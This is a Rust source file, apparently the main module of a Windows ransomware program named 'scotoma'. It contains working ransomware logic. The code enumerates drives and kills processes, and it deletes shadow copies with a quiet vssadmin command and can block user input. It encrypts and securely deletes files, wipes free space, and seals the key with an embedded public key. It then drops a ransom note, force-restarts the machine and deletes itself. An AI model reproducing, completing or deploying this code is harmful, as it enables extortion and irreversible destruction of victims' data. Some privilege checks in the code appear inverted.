#![windows_subsystem = "windows"]

mod config;
mod utils;
mod rename;

use std::io::{self, Write};
use std::os::windows::process::CommandExt;
use std::process::Command;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Instant;
use std::{env, fs, iter, process, vec};
use std::thread::{self, Builder};
use std::fs::File;
use std::path::PathBuf;
use std::error::Error;

use rayon::iter::{IntoParallelRefIterator, ParallelIterator};

use shared::*;

use crate::config::*;

const MB_YESNO: u32 = 0x4;
const MB_OK: u32 = 0;
const MB_ICONWARNING: u32 = 0x30;
const IDNO: i32 = 7;

const ERROR_CRITICAL_FALIURE_BASE: i32 = 1467;

// could probably be lowered even more
// but that dosnt rlly matter lol
const STACK_SIZE: usize = 32 * 1024 * 1024;

#[link(name = "user32")]
unsafe extern "C" {
    unsafe fn MessageBoxW(
        hWnd: isize,
        lpText: *const u16,
        lpCaption: *const u16,
        uType: u32
    ) -> i32;
}

#[link(name = "kernel32")]
unsafe extern "C" {
    unsafe fn VirtualLock(
        lpAddress: *const u8,
        dwSize: usize
    ) -> i32;

    unsafe fn VirtualUnlock(
        lpAddress: *const u8,
        dwSize: usize
    ) -> i32;
}

#[link(name = "user32")]
unsafe extern "C" {
    unsafe fn BlockInput(block: i32) -> i32;
}

#[link(name = "advapi32")]
unsafe extern "C" {
    unsafe fn IsUserAnAdmin() -> i32;
}

fn main() {
    // we do this cuz config::PUBLICK_KEY is fucking massive
    //
    // and i just dont feel like making another function in
    // the builder to detect "static" instead of "const"
    Builder::new()
        .stack_size(STACK_SIZE)
        .spawn(real_main)
        .unwrap()
        .join()
        .unwrap();
}

fn real_main() {
    let drives = if DEBUG_MODE_ENABLED {
        let title = "scotoma (debug mode)"
            .encode_utf16()
            .chain(iter::once(0))
            .collect::<Vec<u16>>();

        let debug_dir = PathBuf::from(DEBUG_MODE_DIR_OVERRIDE);

        unsafe {
            if DEBUG_MODE_DIR_OVERRIDE.is_empty() {
                let text = "debug mode is enabled but the override directory is empty, scotoma will now exit without encrypting anything"
                    .encode_utf16()
                    .chain(iter::once(0))
                    .collect::<Vec<u16>>();

                MessageBoxW(
                    0,
                    text.as_ptr(),
                    title.as_ptr(),
                    MB_ICONWARNING | MB_OK
                );

                process::exit(-1);
            }

            let text = format!("you are about to encrypt the first {} in: {}\n\ndo you want to continue?", DEBUG_MODE_MAX_FILES_ENCRYPTABLE, debug_dir.display())
                .encode_utf16()
                .chain(iter::once(0))
                .collect::<Vec<u16>>();

            let clicked = MessageBoxW(
                0,
                text.as_ptr(),
                title.as_ptr(),
                MB_ICONWARNING | MB_YESNO
            );

            if clicked == IDNO {
                process::exit(0);
            }
        }

        vec![debug_dir]
    } else {
        drive::get_drives()
    };

    unsafe {
        if FORCE_ADMIN && IsUserAnAdmin() != 0 {
            let exec_path = env::current_exe()
                .unwrap();

            loop {
                let status = Command::new("powershell")
                    .arg("-c")
                    .arg(format!("start '{}' -verb RunAs", exec_path.display()))
                    .creation_flags(0x08000000)
                    .status()
                    .unwrap();

                if status.success() {
                    process::exit(0);
                }
            }
        }

        if BLOCK_INPUT && IsUserAnAdmin() == 0 {
            BlockInput(1);
        }

        if DELETE_SHADOW_COPIES && IsUserAnAdmin() == 0 {
            Command::new("vssadmin")
                .arg("delete")
                .arg("shadows")
                .arg("/all")
                .arg("/quiet")
                .creation_flags(0x08000000)
                .spawn()
                .ok();
        }
    }

    for task in PROCESSES_TO_KILL {
        utils::kill_process(task);
    }

    let whitelisted_dirs = WHITELISTED_DIRECTORIES
        .iter()
        .map(|path| path::expand_env_vars(path))
        .collect::<Vec<String>>();

    let whitelisted_names = WHITELISTED_FILE_NAMES
        .iter()
        .map(|str| str.to_string())
        .collect::<Vec<String>>();

    let whitelisted_exts = if ADD_FILE_EXTENSION && !WHITELISTED_FILE_EXTENSIONS.contains(&ENCRYPTED_FILE_EXTENSION) {
        let mut whitelisted = WHITELISTED_FILE_EXTENSIONS
            .iter()
            .map(|str| str.to_string())
            .collect::<Vec<String>>();

        whitelisted.push(ENCRYPTED_FILE_EXTENSION.to_string());

        whitelisted
    } else {
        WHITELISTED_FILE_EXTENSIONS
            .iter()
            .map(|str| str.to_string())
            .collect()
    };

    let mut crypt_key = random::generate_random_bytes(KEY_LENGTH);

    unsafe {
        VirtualLock(crypt_key.as_ptr(), crypt_key.len());
    }

    let debug_mode_files_processed = AtomicUsize::new(0);

    let start = Instant::now();

    drives.par_iter().for_each(|drive| {
        file::enumerate_files(
            &drive,
            FILE_ENUMERATION_CHUNK_SIZE,
            &whitelisted_dirs,
            &whitelisted_exts,
            &whitelisted_names,
            false,
            |files| {
                files.par_iter().for_each(|file| {
                    let processed = process_file(file, &crypt_key);

                    if !DEBUG_MODE_ENABLED {
                        return;
                    }

                    let stdout = io::stdout();
                    let mut lock = stdout.lock();

                    let count = debug_mode_files_processed.fetch_add(1, Ordering::Relaxed) + 1;
                    if count >= DEBUG_MODE_MAX_FILES_ENCRYPTABLE && DEBUG_MODE_MAX_FILES_ENCRYPTABLE != 0 {
                        unsafe {
                            let title = "scotoma (debug mode)"
                                .encode_utf16()
                                .chain(iter::once(0))
                                .collect::<Vec<u16>>();

                            let text = format!("maximum files encryptable during debug mode has been reached ({}), scotoma will now exit", DEBUG_MODE_MAX_FILES_ENCRYPTABLE)
                                .encode_utf16()
                                .chain(iter::once(0))
                                .collect::<Vec<u16>>();

                            MessageBoxW(
                                0,
                                text.as_ptr(),
                                title.as_ptr(),
                                MB_ICONWARNING | MB_OK
                            );

                            process::exit(0);
                        }
                    }

                    match processed {
                        Ok(_) => writeln!(lock, "[-] encrypted: {}", file.display()).ok(),
                        Err(err) => writeln!(lock, "[!] failed: {} - {}", file.display(), err).ok()
                    };
                })
            }
        );
    });

    if DEBUG_MODE_ENABLED {
        println!("encryption finished in {:?}", start.elapsed());
    }

    thread::spawn(move || {
        if OVERWRITE_DELETED_DATA && ENCRYPT_SEPARATELY {
            for drive in &drives {
                drive::overwrite_drive_free_space(drive, OVERWRITE_DELETED_DATA_PASSES);
            }
        }
    });

    let (_, public_keys) = match key::import_key_pairs(None, Some(PUBLICK_KEY)) {
        Ok((_private_keys, public_keys)) => (_private_keys, public_keys),
        Err(err) => {
            if DEBUG_MODE_ENABLED {
                eprintln!("failed to import key - {}", err);
            }

            process::exit(ERROR_CRITICAL_FALIURE_BASE + 1)
        }
    };

    let encrypted_key = match key::encrypt_key(&mut crypt_key, &public_keys.unwrap()) {
        Ok(key) => key,
        Err(err) => {
            if DEBUG_MODE_ENABLED {
                eprintln!("failed to encrypt key - {}", err);
            }

            process::exit(ERROR_CRITICAL_FALIURE_BASE + 2)
        }
    };

    unsafe {
        VirtualUnlock(crypt_key.as_ptr(), crypt_key.len());
    }

    let encoded_encrypted_key = encode::hex_custom_encode(&encrypted_key, HEX_CHAR_SET)
        .to_uppercase()
        .chars()
        .collect::<Vec<char>>()
        .chunks(100)
        .map(|chunk| {
            let str = chunk
                .iter()
                .collect::<String>();

            format!("{:0<100}", str)
        })
        .collect::<Vec<String>>()
        .join("\n");

    let dropped_note_path = match utils::drop_note(&encoded_encrypted_key) {
        Ok(path) => path,
        Err(err) => {
            if DEBUG_MODE_ENABLED {
                eprintln!("failed to drop note - {}", err);
            }

            process::exit(ERROR_CRITICAL_FALIURE_BASE + 3)
        }
    };

    if RESTART {
        Command::new("shutdown")
            .arg("/r")
            .arg("/f")
            .arg("/t")
            .arg("0")
            .creation_flags(0x08000000)
            .spawn()
            .ok();

        return;
    }

    if OPEN_NOTE {
        Command::new("explorer")
            .arg(dropped_note_path)
            .creation_flags(0x08000000)
            .spawn()
            .ok();
    }

    if SELF_DELETE {
        let exec_path = env::current_exe()
            .unwrap();

        let script = format!("ping 127.0.0.1\ndel {}\ndel \"%~f0\"", exec_path.display());

        fs::write(exec_path.join("s.bat"), script).ok();
    }
}

fn process_file(file_path: &PathBuf, key: &[u8]) -> Result<(), Box<dyn Error>> {
    let parent_path = file_path
        .parent()
        .unwrap();

    let encrypted_file_name = {
        let file_name = file_path
            .file_stem()
            .and_then(|str| str.to_str())
            .unwrap_or("")
            .as_bytes();

        crypt::encrypt_data(file_name, key)
            .unwrap()
    };

    let encrypted_file_extension = {
        let file_extension = file_path
            .extension()
            .and_then(|str| str.to_str())
            .unwrap_or("")
            .as_bytes();

        crypt::encrypt_data(file_extension, key)
            .unwrap()
    };

    let file_len = file_path
        .metadata()?
        .len() as usize;

    let chunk_count = (file_len + WRITE_FILE_CHUNK_SIZE - 1) / WRITE_FILE_CHUNK_SIZE;
    let chunk_count = chunk_count.min(u16::MAX as usize);

    let header = header::ProcessedFileHeader::new(
        &encrypted_file_name,
        &encrypted_file_extension,
        WRITE_FILE_CHUNK_SIZE as u16,
        chunk_count as u16
    )?;

    if ENCRYPT_SEPARATELY {
        #[allow(unused_assignments)]
        let mut new_file_path = PathBuf::new();

        let mut must_rename = false;

        if OBFUSCATE_NAMES && ADD_FILE_EXTENSION {
            let mut new_name = rename::get_new_name();
            new_name = format!("{}.{}", new_name, ENCRYPTED_FILE_EXTENSION);

            new_file_path = parent_path.join(new_name);
        } else if OBFUSCATE_NAMES {
            let new_name = rename::get_new_name();
            new_file_path = parent_path.join(new_name);
        } else if ADD_FILE_EXTENSION {
            new_file_path = file_path.with_extension({
                let current_ext = file_path
                    .extension()
                    .and_then(|ext| ext.to_str())
                    .unwrap_or("");

                format!("{}.{}", current_ext, ENCRYPTED_FILE_EXTENSION)
            });
        } else {
            // if it does not have any of those settings
            // we cant just write to the same thing
            // so create a "temp" file then just rename it
            // after the original is deleted
            must_rename = true;

            let new_name = rename::get_new_name();
            new_file_path = parent_path.join(new_name);
        }

        let mut encrypted_file = header.save_to(&new_file_path)?;
        let mut original_file = File::open(file_path)?;

        file::write_encrypt_chunks(&mut original_file, &mut encrypted_file, key, chunk_count)?;

        file::secure_delete_file(file_path, OVERWRITE_DELETED_DATA_PASSES)?;

        if must_rename {
            fs::rename(new_file_path, file_path)?;
        }
    } else {
        let mut original_file = File::open(file_path)?;

        let capacity = header.header_len() + file_len + (chunk_count + 1) * crypt::TAG_LEN;
        let mut buffer = Vec::with_capacity(capacity);

        header.write_to(&mut buffer)?;

        file::write_encrypt_chunks(&mut original_file, &mut buffer, key, chunk_count)?;
        drop(original_file);

        let mut encrypted_file = File::create(file_path)?;
        encrypted_file.write_all(&buffer)?;
        encrypted_file.flush()?;

        drop(encrypted_file);

        let mut new_file_path = PathBuf::new();

        if OBFUSCATE_NAMES && ADD_FILE_EXTENSION {
            let mut new_name = rename::get_new_name();
            new_name = format!("{}.{}", new_name, ENCRYPTED_FILE_EXTENSION);

            new_file_path = parent_path.join(new_name);
        } else if OBFUSCATE_NAMES {
            let new_name = rename::get_new_name();
            new_file_path = parent_path.join(new_name);
        } else if ADD_FILE_EXTENSION {
            new_file_path = file_path.with_extension({
                let current_ext = file_path
                    .extension()
                    .and_then(|ext| ext.to_str())
                    .unwrap_or("");

                format!("{}.{}", current_ext, ENCRYPTED_FILE_EXTENSION)
            });
        }

        if !new_file_path.as_os_str().is_empty() {
            fs::rename(file_path, new_file_path)?;
        }
    }

    Ok(())
}
